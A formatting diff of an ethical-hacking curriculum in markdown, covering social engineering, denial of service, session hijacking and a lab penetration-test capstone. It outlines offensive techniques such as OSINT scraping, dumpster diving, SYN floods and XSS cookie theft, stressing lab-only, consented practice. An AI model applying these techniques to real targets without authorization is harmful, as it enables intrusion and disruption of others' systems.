 - [ ] **Digital Recon:** Execute **OSINT** using **Google Dorks, LinkedIn scraping, GitHub dorking** to extract employee names, emails, roles, tech stacks, and company structure.
-
 
 - [ ] **Physical Recon:** Perform **dumpster diving** to recover **org charts, vendor invoices, sticky notes** with passwords; observe **badge access patterns, delivery procedures**.
 
@@ -1280,6 +1637,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-2-the-digital-assault-remote-vectors"></a>
+
 ### **Stage 2: The Digital Assault (Remote Vectors)**
 
 > [!TIP]
@@ -1300,6 +1658,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-3-the-human-element-direct-interaction"></a>
+
 ### **Stage 3: The Human Element (Direct Interaction)**
 
 > [!TIP]
@@ -1314,6 +1673,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-4-the-physical-breach-boots-on-the-ground"></a>
+
 ### **Stage 4: The Physical Breach (Boots on the Ground)**
 
 > [!TIP]
@@ -1330,6 +1690,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-5-defense-awareness-the-shield"></a>
+
 ### **Stage 5: Defense & Awareness (The Shield)**
 
 > [!TIP]
@@ -1346,6 +1707,7 @@ Robert Cialdini's research on influence identified six universal principles that
 - [ ] **MFA Resilience:** Teach differences between **phishing-resistant MFA (FIDO2/Passkeys)** vs **phishable MFA (SMS/Push/OTP)**; test and mitigate **MFA fatigue** scenarios.
 
 <a id="lab-progression-part-10-social-engineering"></a>
+
 ### **Lab Progression (Part 10: Social Engineering)**
 
 > [!TIP]
@@ -1355,16 +1717,18 @@ Robert Cialdini's research on influence identified six universal principles that
 - [ ] **Header Forensics Lab:** Analyze benign/phishing email headers and identify sender path, SPF/DKIM/DMARC result, and suspicious infrastructure.
 - [ ] **GoPhish Simulation Lab:** Run a consented internal lab campaign against test inboxes only; measure open/click/report rates.
 - [ ] **Pretext Review:** Write three pretexts and then write the defensive awareness guidance that would defeat them.
-> [!IMPORTANT]
-> **Move-On Gate:** Produce a social-engineering simulation plan with ROE, consent model, metrics, and debrief template.
+  > [!IMPORTANT]
+  > **Move-On Gate:** Produce a social-engineering simulation plan with ROE, consent model, metrics, and debrief template.
 
 <a id="toc-part-11-denial-of-service"></a>
 <a id="part-11-denial-of-service"></a>
+
 ## Part 11: Denial of Service
 
 > **Safety Gate:** DoS testing is local-lab-only unless a written contract explicitly authorizes it. Never run DoS tools against public IPs, SaaS platforms, school networks, ISP infrastructure, or bug bounty targets unless the scope explicitly permits availability testing.
 
 <a id="stage-1-objective-strategy-the-planning"></a>
+
 ### **Stage 1: Objective & Strategy (The Planning)**
 
 > [!TIP]
@@ -1379,6 +1743,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-2-the-arsenal-attack-methods"></a>
+
 ### **Stage 2: The Arsenal (Attack Methods)**
 
 > [!TIP]
@@ -1395,6 +1760,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-3-infrastructure-execution-the-assault"></a>
+
 ### **Stage 3: Infrastructure & Execution (The Assault)**
 
 > [!TIP]
@@ -1411,6 +1777,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-4-defense-mitigation-the-shield"></a>
+
 ### **Stage 4: Defense & Mitigation (The Shield)**
 
 > [!TIP]
@@ -1427,15 +1794,16 @@ Robert Cialdini's research on influence identified six universal principles that
 - [ ] **ISP/Carrier Coordination:** Work with **ISP's DDoS mitigation services** to scrub traffic upstream; establish **BGP blackholing** to discard attack traffic at border; maintain **redundant ISPs/circuits**.
 
 <a id="lab-progression-part-11-denial-of-service"></a>
+
 ### **Lab Progression (Part 11: Denial of Service)**
 
-| Level | Task | Deliverable |
-|-------|------|-------------|
-| 1 | Study DoS attack types and classify by OSI layer | Classification document with examples |
-| 2 | Simulate SYN flood against lab web server with hping3 | Traffic capture + server impact analysis |
-| 3 | Test Slowloris against Apache in lab, then apply mitigation | Before/after performance comparison |
-| 4 | Configure rate limiting and SYN cookies on lab firewall | Firewall configuration + test results |
-| 5 | Design a DDoS defense architecture for a hypothetical company | Architecture diagram + defense plan |
+| Level | Task                                                          | Deliverable                              |
+| ----- | ------------------------------------------------------------- | ---------------------------------------- |
+| 1     | Study DoS attack types and classify by OSI layer              | Classification document with examples    |
+| 2     | Simulate SYN flood against lab web server with hping3         | Traffic capture + server impact analysis |
+| 3     | Test Slowloris against Apache in lab, then apply mitigation   | Before/after performance comparison      |
+| 4     | Configure rate limiting and SYN cookies on lab firewall       | Firewall configuration + test results    |
+| 5     | Design a DDoS defense architecture for a hypothetical company | Architecture diagram + defense plan      |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can explain and classify DoS/DDoS attack types, demonstrate basic DoS in a lab, and design defensive countermeasures at the network, host, and application layers.
@@ -1444,9 +1812,11 @@ Robert Cialdini's research on influence identified six universal principles that
 
 <a id="toc-part-12-session-hijacking"></a>
 <a id="part-12-session-hijacking"></a>
+
 ## Part 12: Session Hijacking
 
 <a id="stage-1-reconnaissance-vulnerability-analysis"></a>
+
 ### **Stage 1: Reconnaissance & Vulnerability Analysis**
 
 > [!TIP]
@@ -1463,6 +1833,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-2-stealing-the-session-id-the-attack-vectors"></a>
+
 ### **Stage 2: Stealing the Session ID (The Attack Vectors)**
 
 > [!TIP]
@@ -1481,6 +1852,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-3-execution-impersonation"></a>
+
 ### **Stage 3: Execution & Impersonation**
 
 > [!TIP]
@@ -1495,6 +1867,7 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-4-defense-mitigation-the-shield"></a>
+
 ### **Stage 4: Defense & Mitigation (The Shield)**
 
 > [!TIP]
@@ -1511,15 +1884,16 @@ Robert Cialdini's research on influence identified six universal principles that
 - [ ] **Network Monitoring:** Use **IDS/IPS** to detect **MITM patterns, ARP spoofing, SSL stripping attempts**. _(See Part 9 for canonical spoofing coverage.)_
 
 <a id="lab-progression-part-12-session-hijacking"></a>
+
 ### **Lab Progression (Part 12: Session Hijacking)**
 
-| Level | Task | Deliverable |
-|-------|------|-------------|
-| 1 | Analyze session cookies in a lab web app (entropy, attributes) | Cookie analysis report |
-| 2 | Perform session fixation attack on a vulnerable lab app | Attack steps + session token evidence |
-| 3 | Steal session cookies via XSS in DVWA/WebGoat | Session hijack lab report |
-| 4 | Implement secure session management on a lab app | Hardened configuration document |
-| 5 | Test session hijacking defenses (regeneration, binding, timeouts) | Defense effectiveness report |
+| Level | Task                                                              | Deliverable                           |
+| ----- | ----------------------------------------------------------------- | ------------------------------------- |
+| 1     | Analyze session cookies in a lab web app (entropy, attributes)    | Cookie analysis report                |
+| 2     | Perform session fixation attack on a vulnerable lab app           | Attack steps + session token evidence |
+| 3     | Steal session cookies via XSS in DVWA/WebGoat                     | Session hijack lab report             |
+| 4     | Implement secure session management on a lab app                  | Hardened configuration document       |
+| 5     | Test session hijacking defenses (regeneration, binding, timeouts) | Defense effectiveness report          |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can identify weak session management, perform session hijacking via multiple vectors (fixation, XSS, sniffing), and implement secure session handling with proper cookie attributes, regeneration, and MFA.
@@ -1528,7 +1902,6 @@ Robert Cialdini's research on influence identified six universal principles that
 
 ---
 
-
 ---
 
 ### 🏆 Phase 2 Capstone Project
@@ -1536,6 +1909,7 @@ Robert Cialdini's research on influence identified six universal principles that
 **Complete a Full Penetration Test on a Deliberately Vulnerable Lab**
 
 Select a multi-machine vulnerable environment (HTB Pro Lab, VulnHub chain, or your own Phase 1 lab):
+
 - [ ] **Perform full recon** (passive + active footprinting, scanning, enumeration)
 - [ ] **Achieve initial access** on at least 2 machines using different vectors
 - [ ] **Escalate privileges** to root/SYSTEM on each machine
@@ -1543,6 +1917,7 @@ Select a multi-machine vulnerable environment (HTB Pro Lab, VulnHub chain, or yo
 - [ ] **Document the full kill chain** from recon to impact
 
 **Deliverables:**
+
 - [ ] Professional penetration test report using PTES template (executive summary, methodology, findings, remediation)
 - [ ] Attack chain diagram showing the complete path from initial access to domain compromise
 - [ ] All evidence (screenshots, tool output, scripts) organized in your Git repository
